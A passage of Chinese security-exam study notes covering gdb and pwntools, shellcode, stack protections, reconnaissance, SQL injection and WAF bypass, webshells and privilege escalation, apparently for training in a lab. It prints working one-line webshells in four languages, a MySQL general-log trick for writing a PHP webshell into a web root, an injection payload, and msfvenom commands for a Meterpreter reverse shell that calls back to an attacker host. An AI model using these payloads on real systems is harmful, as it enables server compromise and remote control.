常用工具</h3>\n<ul>\n<li>IDA pro</li>\n</ul>\n<ul>\n<li>\n<p>gdb 动态分析工具</p>\n<ul>\n<li>\n<p>基本命令</p>\n<ul>\n<li>程序运行\n<ul>\n<li>run</li>\n<li>continue</li>\n<li>si (step into) 步入</li>\n<li>ni (next instruction) 下一个指令</li>\n</ul>\n</li>\n<li>断点\n<ul>\n<li>break *0x400566</li>\n<li>into breakpoint</li>\n<li>delete 1 删除断点</li>\n</ul>\n</li>\n<li>查看信息\n<ul>\n<li>x/wx 0x400526</li>\n<li>disas main 反汇编</li>\n<li>info registers</li>\n<li>backtrace 栈回溯</li>\n</ul>\n</li>\n<li>attach pid 连接到某个进程上调试</li>\n<li>set *address=value 设置某地址的值</li>\n</ul>\n</li>\n<li>\n<p>GDB - peda</p>\n<ul>\n<li>Python Exploit Development Assistance for GDB</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xvbmdsZC9wZWRh\">https://github.com/longld/peda</span></li>\n<li>功能\n<ul>\n<li>checksec：查看保护机制</li>\n<li>elfsymbol：查看程序使用的函数 plt 地址</li>\n<li>vmmap：查看内存映射</li>\n<li>find/searchmem：在内存中查找特定的字符串</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>pwntools</p>\n<ul>\n<li>基于 python 的 exploit 编写库</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3B3bnRvb2xzLnJlYWR0aGVkb2NzLmlv\">http://pwntools.readthedocs.io</span></li>\n<li>启动程序\n<ul>\n<li>io = process(\"./binary\")</li>\n<li>io = process([\"./bin\"].env={\"LD_PRELOAD\":\"./libc-2.23.so\"})</li>\n<li>io = remote(\"127.0.0.1\",50001)</li>\n<li>ncat -ve ./bof -kl 50001 (其中 bof 为文件)</li>\n</ul>\n</li>\n<li>交互\n<ul>\n<li>io.send()/sendline()</li>\n<li>io.recv()/recvline()/recvutil()</li>\n<li>sendafter(\"\",\"\")</li>\n<li>io.interactive()</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>ELF / 汇编</p>\n<ul>\n<li>section\n<ul>\n<li>文件格式\n<ul>\n<li>Linux -- ELF</li>\n<li>Windows -- PE</li>\n</ul>\n</li>\n<li>.bss 存放未初始化的全局变量</li>\n<li>.data 存放已经初始化的全局变量</li>\n<li>.text 存放程序执行代码</li>\n<li>.rodata 存放只读程序</li>\n</ul>\n</li>\n<li>系统调用</li>\n<li>32 位利用栈</li>\n<li>64 位利用寄存器</li>\n<li>系统调用号：RAX</li>\n<li>参数：RDI RSI RDX RCX R8 R9</li>\n<li>返回值：RAX</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zeXNjYWxscy53M2NoYWxscy5jb20vP2FyY2g9eDg2XzY0\">记录的一些系统调用</span></li>\n</ul>\n</li>\n<li>\n<p>shellcode: 将要在受害软件上执行的恶意代码</p>\n<ul>\n<li>\n<p>作用：启动 shell</p>\n</li>\n<li>\n<p>nasm -f elf64 shasm.asm -o shasm.o 编译汇编程序</p>\n</li>\n<li>\n<p>Id -s -o shasm shasm.o 链接目标文件</p>\n</li>\n<li>\n<p>objcopy -O binary shasm.o code 提取其中的 shellcode 部分</p>\n</li>\n<li>\n<p>xxd code 显示方便</p>\n</li>\n<li>\n<p>一个接收 shellcode 的程序，func.c</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h&gt;</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>shellcode<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>shellcode<span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>fptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> shellcode<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">fptr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>编译  <code>gcc func.c -zexecstack -o func</code></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>ncat -ve ./ 文件名 -kl port</li>\n</ul>\n<h3 id=\"缓冲区溢出\"><a class=\"anchor\" href=\"#缓冲区溢出\">#</a> 缓冲区溢出</h3>\n<p>return to shellcode</p>\n<ul>\n<li>\n<p>测试偏移覆盖返回地址</p>\n<ul>\n<li>pwntools cyclic</li>\n<li>gdp-pda\n<ul>\n<li>pattern create 100 shellcode</li>\n<li>pattern offset</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>使用 pwntools 产生 shellcode</p>\n<ul>\n<li>context.arch=\"amd64\" 提前声明系统架构</li>\n<li>shcode = asm(<span class=\"exturl\" data-url=\"aHR0cDovL3NoZWxsY3JhZnQuc2g=\">shellcraft.sh</span> ()) 自动产生 shellcode</li>\n</ul>\n</li>\n<li>\n<p>编译选项</p>\n<ul>\n<li>gcc -fno-stack-protector -z execstack bof.c -o bof</li>\n</ul>\n</li>\n<li>\n<p>protection</p>\n<ul>\n<li>\n<p>ASLR</p>\n<ul>\n<li>\n<p>地址空间随机化</p>\n</li>\n<li>\n<p>堆、栈、共享库每次运行的位置都随机变化</p>\n</li>\n<li>\n<p>查看是否开启 cat/proc/sys/kernel/randomize_va_space</p>\n</li>\n<li>\n<p>ldd 查看地址</p>\n</li>\n</ul>\n</li>\n<li>\n<p>DEP (数据执行保护) 又称为 NX</p>\n<ul>\n<li>gcc 编译默认开启 使用 -z execstack 取消 NX 保护</li>\n</ul>\n</li>\n<li>\n<p>PIE</p>\n<ul>\n<li>\n<p>位置独立的可执行区域</p>\n</li>\n<li>\n<p>gcc 默认不开启，-fPIC -pie 开启</p>\n</li>\n<li>\n<p>data 和 code 段跟着随机化，ret2shellcode 没有固定位置可以利用</p>\n</li>\n</ul>\n</li>\n<li>\n<p>StackGuard</p>\n<ul>\n<li>\n<p>随机生成在函数调用前将 canary 放入栈中，发现改变立即终止</p>\n</li>\n<li>\n<p>阻挡了 stack overflow 的攻击</p>\n</li>\n<li>\n<p>gcc 默认开启 -fno-stack-protector 关闭</p>\n</li>\n</ul>\n</li>\n<li>\n<p>RELRO</p>\n<ul>\n<li>\n<p>gcc -WI,-z,relro,-z now 开启 full</p>\n</li>\n<li>\n<p>disable .got.plt/.got 都可写</p>\n</li>\n<li>\n<p>Partial (default) .got 可写</p>\n</li>\n<li>\n<p>Full 加载程序前解析全部函数 got 表可以不写</p>\n</li>\n</ul>\n</li>\n<li>\n<p>Lazy binding</p>\n<ul>\n<li>\n<p>GOT 表中存放着函数真正的位置，PLT 过程链接库</p>\n</li>\n<li>\n<p>程序中会调用动态库中的函数，但不是所有都能用到，这里 ELF 采取延迟绑定的机制，等到真正调用时，才去找函数</p>\n</li>\n<li>\n<p>延迟绑定机制导致 GOT 表一般可写</p>\n</li>\n<li>\n<p>覆盖 GOT 表中地址是更改程序流程的常用手段</p>\n</li>\n<li>\n<p>保护措施 RELRO</p>\n</li>\n</ul>\n</li>\n<li>\n<p>return library</p>\n<ul>\n<li>配合信息泄露获取的 libc 地址，算出 system 等函数地址</li>\n</ul>\n</li>\n<li>\n<p>ROP</p>\n<ul>\n<li>\n<p>绕过 DEP (NX)</p>\n</li>\n<li>\n<p>由多个包含 ret 的指令片段组成又称为 gadget</p>\n</li>\n<li>\n<p>ROPgadget --binary file</p>\n</li>\n<li>\n<p>ROP chain (将多个 gadget 组合到一起连续调用多个函数)</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"真题解析之逆向知识及题目讲解\"><a class=\"anchor\" href=\"#真题解析之逆向知识及题目讲解\">#</a> 真题解析之逆向知识及题目讲解</h1>\n<h2 id=\"汇编基础\"><a class=\"anchor\" href=\"#汇编基础\">#</a> 汇编基础</h2>\n<h3 id=\"栈的概念\"><a class=\"anchor\" href=\"#栈的概念\">#</a> 栈的概念</h3>\n<h3 id=\"寄存器\"><a class=\"anchor\" href=\"#寄存器\">#</a> 寄存器</h3>\n<ul>\n<li>\n<p>通用寄存器</p>\n<ul>\n<li>\n<p>8 位 AL AH BL BH</p>\n</li>\n<li>\n<p>16 位 AX BX CX DX</p>\n</li>\n<li>\n<p>32 位 EAX EBX ECX EDX</p>\n</li>\n<li>\n<p>64 位 RAX RBX RCX RDX</p>\n</li>\n</ul>\n</li>\n<li>\n<p>指令指针寄存器：IP (指向下一条要取指的指令地址)</p>\n</li>\n<li>\n<p>基址寄存器：BP 栈底</p>\n</li>\n</ul>\n<ul>\n<li>堆栈寄存器：SP 栈顶</li>\n</ul>\n<h3 id=\"指令\"><a class=\"anchor\" href=\"#指令\">#</a> 指令</h3>\n<ul>\n<li>\n<p>MOV：数据传送指令</p>\n</li>\n<li>\n<p>CALL：1. 把当前的 IP 压入栈中，2、跳转到指定位置</p>\n</li>\n<li>\n<p>RET：用栈中所保存的数据赋值给 IP, 跳转回来</p>\n</li>\n<li>\n<p>PUSH：先减 ESP, 再把数据放进去</p>\n</li>\n<li>\n<p>POP：先把数据 POP 出，再加 ESP</p>\n</li>\n<li>\n<p>LEAVE：MOV SP，BP ; POP BP</p>\n</li>\n</ul>\n<ul>\n<li>\n<p>跳转指令</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.15_1.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>EFLAG 寄存器</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.15_2.jpg\" alt=\"\"></p>\n</li>\n</ul>\n<p>IDA shift+F7 查看 elf 的段 (.init .init_array (存放函数执行前的要执行的函数指针))</p>\n<h1 id=\"31-信息搜集\"><a class=\"anchor\" href=\"#31-信息搜集\">#</a> 3.1 信息搜集</h1>\n<h2 id=\"服务器类型-平台-版本\"><a class=\"anchor\" href=\"#服务器类型-平台-版本\">#</a> 服务器类型、平台、版本</h2>\n<ol>\n<li>\n<p>nmap</p>\n<p>nmap 进行扫描，</p>\n<p><code>nmap -O 目标ip</code>  探测系统类型</p>\n<p><code>nmap -sV 目标ip</code>  探测服务类型</p>\n<p>-sT -sU 等</p>\n<p>状态： state open 开放，closed 关闭，filtered 被防火墙 \\IDS\\IPS 等屏蔽、无法确定的状态，unfiltered 没有被屏蔽</p>\n</li>\n<li>\n<p>owasp ZAP</p>\n</li>\n</ol>\n<h2 id=\"网站容器-iis-apache-nginx-tomcat\"><a class=\"anchor\" href=\"#网站容器-iis-apache-nginx-tomcat\">#</a> 网站容器 --IIS、Apache、nginx、tomcat</h2>\n<ol>\n<li>whatweb</li>\n<li>nmap</li>\n</ol>\n<h2 id=\"脚本类型-jsp-php-asp-aspx\"><a class=\"anchor\" href=\"#脚本类型-jsp-php-asp-aspx\">#</a> 脚本类型 --jsp、php、asp、aspx</h2>\n<ol>\n<li>根据页面</li>\n<li>dirbuster</li>\n<li>site:ip filetype:?php|jsp|asp</li>\n</ol>\n<h2 id=\"数据库类型\"><a class=\"anchor\" href=\"#数据库类型\">#</a> 数据库类型</h2>\n<p>常见搭配：php--mysql、postgresql；asp 和 aspx--access、sqlserver；jsp--mysql、oracle</p>\n<h2 id=\"cms\"><a class=\"anchor\" href=\"#cms\">#</a> CMS</h2>\n<p>常见 CMS： 织梦（Dedecms）\\Dizcuz\\phpweb\\phpcms\\ 帝国 \\ASPCMS\\WORDPRESS</p>\n<p>工具：御剑 web 指纹识别、whatweb、椰树等</p>\n<h2 id=\"waf-安全狗-安全狗的设置方式-找到绕过的方法\"><a class=\"anchor\" href=\"#waf-安全狗-安全狗的设置方式-找到绕过的方法\">#</a> waf 安全狗、安全狗的设置方式、找到绕过的方法</h2>\n<h2 id=\"网站目录后台\"><a class=\"anchor\" href=\"#网站目录后台\">#</a> 网站目录后台</h2>\n<p>后台扫描</p>\n<h2 id=\"敏感信息\"><a class=\"anchor\" href=\"#敏感信息\">#</a> 敏感信息</h2>\n<p>后台目录、安装包、上传目录、网站根目录、数据库管理接口、安全页面（install.php 二次安装绕过）、phpinfo、robots.txt</p>\n<h2 id=\"旁站和-c-站\"><a class=\"anchor\" href=\"#旁站和-c-站\">#</a> 旁站和 c 站</h2>\n<p>主站难攻击，可先去旁站找漏洞，拿到控制权</p>\n<p>namp</p>\n<h2 id=\"漏洞挖掘\"><a class=\"anchor\" href=\"#漏洞挖掘\">#</a> 漏洞挖掘</h2>\n<ul>\n<li>系统主机：Nessus</li>\n</ul>\n<ul>\n<li>web 漏洞：AVWS\\Burp、OWASP ZAP\\WPSCAN\\APPSCAN</li>\n</ul>\n<h2 id=\"常见的端口号\"><a class=\"anchor\" href=\"#常见的端口号\">#</a> 常见的端口号</h2>\n<p>21/22/69/139 文件共享端口</p>\n<p>22/23/3389 远程端口</p>\n<p>80/443/8080</p>\n<p>7001/7002 weblogic</p>\n<p>3306 mysql</p>\n<p>1443 mssql</p>\n<p>1521 oracle</p>\n<p>6379 redis</p>\n<h1 id=\"33-web-应用安全\"><a class=\"anchor\" href=\"#33-web-应用安全\">#</a> 3.3 web 应用安全</h1>\n<h2 id=\"owasp\"><a class=\"anchor\" href=\"#owasp\">#</a> owasp</h2>\n<h2 id=\"owasp-top10\"><a class=\"anchor\" href=\"#owasp-top10\">#</a> owasp top10</h2>\n<h3 id=\"sql-注入漏洞\"><a class=\"anchor\" href=\"#sql-注入漏洞\">#</a> sql 注入漏洞</h3>\n<h4 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h4>\n<h4 id=\"流程-2\"><a class=\"anchor\" href=\"#流程-2\">#</a> 流程</h4>\n<ul>\n<li>\n<p>注入点探测</p>\n<ul>\n<li>\n<p>自动探测：web 漏扫工具，AWVS、APPSCAN、openVAS、nessus、OWASP ZAP、Burpsuit</p>\n</li>\n<li>\n<p>手工方式：手工构造 payload</p>\n</li>\n</ul>\n</li>\n<li>\n<p>信息获取</p>\n<ul>\n<li>\n<p>环境信息：数据库的类型、版本、操作系统版本、用户信息</p>\n</li>\n<li>\n<p>数据库的信息：库名、表名、字段名、数据值（管理员账户密码）</p>\n</li>\n</ul>\n</li>\n<li>\n<p>获取权限</p>\n<ul>\n<li>获取操作系统权限：执行 shell、上传大马或小马</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"工具\"><a class=\"anchor\" href=\"#工具\">#</a> 工具</h4>\n<p>sqlmap</p>\n<p>整型、字符型</p>\n<p>搜索型</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> password <span class=\"token operator\">like</span> <span class=\"token string\">'%$pwd%'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> password<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>当此时输入的 <code>$pwd</code>  为  <code>' or 1=1 and '%'='</code>  时，原语句变为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> password <span class=\"token operator\">like</span> <span class=\"token string\">'%'</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token string\">'%'</span><span class=\"token operator\">=</span><span class=\"token string\">'%'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> password<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>此时由于 and 的优先级最高，那么会判断其前后两条语句，即</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> password <span class=\"token operator\">like</span> <span class=\"token string\">'%'</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">'%'</span><span class=\"token operator\">=</span><span class=\"token string\">'%'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> password<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>很明显为真，故绕过</p>\n<h3 id=\"xss\"><a class=\"anchor\" href=\"#xss\">#</a> XSS</h3>\n<h3 id=\"上传漏洞\"><a class=\"anchor\" href=\"#上传漏洞\">#</a> 上传漏洞</h3>\n<h4 id=\"上传绕过\"><a class=\"anchor\" href=\"#上传绕过\">#</a> 上传绕过</h4>\n<p>客户端：js 检查</p>\n<p>服务端：</p>\n<ul>\n<li>\n<p>检查后缀</p>\n</li>\n<li>\n<p>黑名单：可解析的后缀.php、.xxx，</p>\n</li>\n<li>\n<p>上传伪静态.htaccess 点绕过 空格绕过 '::$DATA 绕过</p>\n</li>\n<li>\n<p>白名单：%00 截断、0x00 截断、MIME 绕过</p>\n</li>\n<li>\n<p>检查内容</p>\n<ul>\n<li>\n<p>文件头</p>\n</li>\n<li>\n<p>突破 getimagesize ()</p>\n</li>\n<li>\n<p>二次渲染</p>\n</li>\n</ul>\n</li>\n<li>\n<p>代码逻辑</p>\n<ul>\n<li>条件竞争</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"csrf\"><a class=\"anchor\" href=\"#csrf\">#</a> CSRF</h3>\n<h3 id=\"ssrf\"><a class=\"anchor\" href=\"#ssrf\">#</a> SSRF</h3>\n<p>服务器端请求伪造，通过漏洞访问内网获取信息</p>\n<h3 id=\"暴力破解漏洞\"><a class=\"anchor\" href=\"#暴力破解漏洞\">#</a> 暴力破解漏洞</h3>\n<p>Hydra - 九头蛇（ftp、ssh、telent、mysql 等）</p>\n<h3 id=\"文件包含漏洞\"><a class=\"anchor\" href=\"#文件包含漏洞\">#</a> 文件包含漏洞</h3>\n<h3 id=\"xxe-漏洞\"><a class=\"anchor\" href=\"#xxe-漏洞\">#</a> XXE 漏洞</h3>\n<h3 id=\"反序列化漏洞\"><a class=\"anchor\" href=\"#反序列化漏洞\">#</a> 反序列化漏洞</h3>\n<h1 id=\"34-sql-注入及-waf-绕过\"><a class=\"anchor\" href=\"#34-sql-注入及-waf-绕过\">#</a> 3.4 sql 注入及 waf 绕过</h1>\n<h2 id=\"waf\"><a class=\"anchor\" href=\"#waf\">#</a> waf</h2>\n<p>WAF（Web Application Firework）web 应用防火墙</p>\n<h3 id=\"类型\"><a class=\"anchor\" href=\"#类型\">#</a> 类型</h3>\n<ul>\n<li>\n<p>软件型</p>\n</li>\n<li>\n<p>硬件型</p>\n</li>\n<li>\n<p>云 WAF 反向代理工作，通过配置 NS 记录或者 CNAME 记录，带有防护的 CDN</p>\n</li>\n<li>\n<p>网站系统内置的 WAF（代码之类的）</p>\n</li>\n</ul>\n<h3 id=\"功能\"><a class=\"anchor\" href=\"#功能\">#</a> 功能</h3>\n<ul>\n<li>审计</li>\n<li>访问控制 / 过滤</li>\n<li>web 加固</li>\n</ul>\n<h3 id=\"waf-怎么识别扫描器\"><a class=\"anchor\" href=\"#waf-怎么识别扫描器\">#</a> WAF 怎么识别扫描器</h3>\n<ul>\n<li>\n<p>AWVS、SQLMAP、APPscan、OpenVAS 等工具（基于白盒 / 灰盒渗透测试）</p>\n</li>\n<li>\n<p>以下几点来识别 WAF：</p>\n<ul>\n<li>\n<p>扫描器指纹（head 字段 / 请求的参数值）</p>\n</li>\n<li>\n<p>单 IP+cookie 某一时间段触发多少次来判断</p>\n</li>\n<li>\n<p>隐藏连接标签</p>\n</li>\n</ul>\n</li>\n<li>\n<p>如何判断目标是否有 WAF</p>\n<ul>\n<li>\n<p>sqlmap -u url --identity-waf --batch</p>\n</li>\n<li>\n<p>手工判断</p>\n<ul>\n<li>\n<p>写一个注入到一个不存在的参数，用来触发 WAF</p>\n</li>\n<li>\n<p>触发：形式变现：页面无法访问、响应码异常、返回与页面不符</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"sql-注入绕过\"><a class=\"anchor\" href=\"#sql-注入绕过\">#</a> SQL 注入绕过</h2>\n<p>黑名单过滤：空格、\\、/、'、and、or、union、select、sleep ()、\"</p>\n<ul>\n<li>\n<p>双写绕过</p>\n</li>\n<li>\n<p>大小写绕过</p>\n</li>\n<li>\n<p>编码绕过（base64、url、ascii、宽字符、Unicode）</p>\n</li>\n<li>\n<p>替换关键字</p>\n</li>\n<li>\n<p>注释绕过（内联注释 /**/ ）</p>\n</li>\n</ul>\n<p>等等等</p>\n<h1 id=\"35-webshell\"><a class=\"anchor\" href=\"#35-webshell\">#</a> 3.5 webshell</h1>\n<h2 id=\"概念\"><a class=\"anchor\" href=\"#概念\">#</a> 概念</h2>\n<p>web + shell</p>\n<p>web：web 服务器上</p>\n<p>shell：用脚本语言编写的脚本程序</p>\n<p>webshell 用来进行网站和服务器管理的脚本程序</p>\n<h2 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h2>\n<ul>\n<li>\n<p>大马：体积大、功能全、会调用系统相关的函数、代码通过加密的方式隐藏</p>\n</li>\n<li>\n<p>小马：体积小、功能小、如只有上传功能</p>\n</li>\n<li>\n<p>一句话木马 / 混淆一句话：代码短、只有一行、安全性高、隐蔽性强、可变形免杀</p>\n</li>\n</ul>\n<h2 id=\"编写方法\"><a class=\"anchor\" href=\"#编写方法\">#</a> 编写方法</h2>\n<ul>\n<li>\n<p>asp： <code>&lt;%execute(request(\"value\"))%&gt;</code></p>\n</li>\n<li>\n<p>php： <code>&lt;?php eval($_POST[1]);?&gt;</code></p>\n</li>\n<li>\n<p>jsp：</p>\n<pre><code class=\"language-jsp\">&lt;%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%&gt;\n\n&lt;%\nif(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());\n%&gt;\n</code></pre>\n</li>\n<li>\n<p>aspx:</p>\n<pre><code class=\"language-asp\">&lt;%@ Page Language=\"Jscript\"%&gt;\n&lt;%eval(Request.Item[\"value\"])%&gt;\n</code></pre>\n</li>\n</ul>\n<p>使用方法</p>\n<ul>\n<li>\n<p>直接通过上传 webshell 到服务器的 web 目录</p>\n</li>\n<li>\n<p>找到数据库是.asp、.php、.jsp 格式的网站，然后留言板、论坛文章发表的方式、把一句话木马添加到数据库中</p>\n</li>\n<li>\n<p>把一句话木马插入到网站的动态页面，然后直接通过客户端（蚁剑、菜刀...）连接网页</p>\n</li>\n</ul>\n<h2 id=\"上传攻击原理\"><a class=\"anchor\" href=\"#上传攻击原理\">#</a> 上传攻击原理</h2>\n<p>利用函数，控制参数，执行任意语句，执行命令</p>\n<h2 id=\"上传绕过方法\"><a class=\"anchor\" href=\"#上传绕过方法\">#</a> 上传绕过方法</h2>\n<ol>\n<li>js 绕过：抓包修改、禁用 js</li>\n<li>%00 绕过</li>\n</ol>\n<h1 id=\"36-webshell-提权\"><a class=\"anchor\" href=\"#36-webshell-提权\">#</a> 3.6 webshell 提权</h1>\n<h2 id=\"获取-webshell\"><a class=\"anchor\" href=\"#获取-webshell\">#</a> 获取 webshell</h2>\n<h3 id=\"phpmyadmin-提权写文件写一句话木马\"><a class=\"anchor\" href=\"#phpmyadmin-提权写文件写一句话木马\">#</a> phpmyadmin 提权写文件，写一句话木马</h3>\n<h3 id=\"日志写入一句话\"><a class=\"anchor\" href=\"#日志写入一句话\">#</a> 日志写入一句话</h3>\n<ul>\n<li>\n<p>首先要开启日志记录</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">show</span> VARIABLES <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%general%'</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">#查看是否开启</span></pre></td></tr></tbody></table></figure><p>如果返回</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>general_log    <span class=\"token keyword\">OFF</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>general_log_file    C:\\phpStudy\\PHPTutorial\\MySQL\\<span class=\"token keyword\">data</span>\\zhong<span class=\"token operator\">-</span>PC<span class=\"token punctuation\">.</span>log</pre></td></tr></tbody></table></figure><p>可以看到为关闭状态</p>\n<p>为了通过日志获得 webshell，我们需要开启，同时为了使得日志能够被解析，将其日志文件命名为 php 文件，并放在网站根目录</p>\n<p>根目录可以通过 phpinfo.php 获知</p>\n</li>\n<li>\n<p>执行以下 sql 语句</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span> <span class=\"token keyword\">global</span> general_log <span class=\"token operator\">=</span> <span class=\"token string\">'on'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">set</span> <span class=\"token keyword\">global</span> general_log_file <span class=\"token operator\">=</span> <span class=\"token string\">'C:\\\\phpStudy\\\\PHPTutorial\\\\www\\\\1.php'</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>再执行</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">show</span> VARIABLES <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%general%'</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>返回</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>general_log  <span class=\"token keyword\">ON</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>general_log_file   C:\\phpStudy\\PHPTutorial\\www\\<span class=\"token number\">1.</span>php</pre></td></tr></tbody></table></figure><p>然后执行</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php eval($_POST[1]);?&gt;'</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p>访问日志文件</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguNDcuMTQwLzEucGhw\">http://192.168.47.140/1.php</span></p>\n<p>可以看到 php 报错，未设置  <code>1</code>  的值</p>\n</li>\n</ul>\n<p>蚁剑连接</p>\n<h2 id=\"生成木马\"><a class=\"anchor\" href=\"#生成木马\">#</a> 生成木马</h2>\n<p>打开 kali 机，利用 msfvenom 生成木马</p>\n<p>这里以 windows 机为例</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>msfvenom <span class=\"token parameter variable\">-p</span> windows/x64/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.47.129 <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> <span class=\"token parameter variable\">-a</span> x64 <span class=\"token parameter variable\">-f</span> exe <span class=\"token operator\">&gt;</span><span class=\"token number\">4</span>.exe</pre></td></tr></tbody></table></figure><p>其中 <code>LHOST</code>  为本地攻击机（即 kali）， <code>LPORT</code>  为端口， <code>-a</code>  为系统位数， <code>-f</code>  生成文件类型</p>\n<p>32 位系统</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>msfvenom <span class=\"token parameter variable\">-p</span> windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.47.129 <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> <span class=\"token parameter variable\">-a</span> x86 <span class=\"token parameter variable\">-f</span> exe <span class=\"token operator\">&gt;</span><span class=\"token number\">4</span>.exe</pre></td></tr></tbody></table></figure><p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_1.jpg\" 